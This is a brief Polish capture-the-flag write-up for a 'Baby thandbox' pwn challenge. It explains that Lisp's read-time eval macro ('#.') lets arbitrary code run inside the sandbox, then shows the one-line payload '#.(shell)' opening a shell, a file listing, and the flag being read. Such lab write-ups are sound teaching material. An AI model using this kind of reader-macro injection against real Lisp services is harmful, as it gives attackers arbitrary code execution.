# Baby thandbox - pwn

Korzystając z [read-time eval macro](https://stackoverflow.com/a/14497188) można wyevalować jaki się chce kod LISP'a. Po wpisaniu "shell" dostajemy shella.

```shell=
;; Loading file /sandbox ...
> #.(shell)
ls
bin
etc
flag_144de66289ad4b9ffa8578cb862c7db7.txt
lib
lib64
root
sandbox
sbin
usr

cat flag_144de66289ad4b9ffa8578cb862c7db7.txt
ecsc23{LISP_is_a_speech_defect_in_which_s_is_pronounced_like_th_in_thick}
```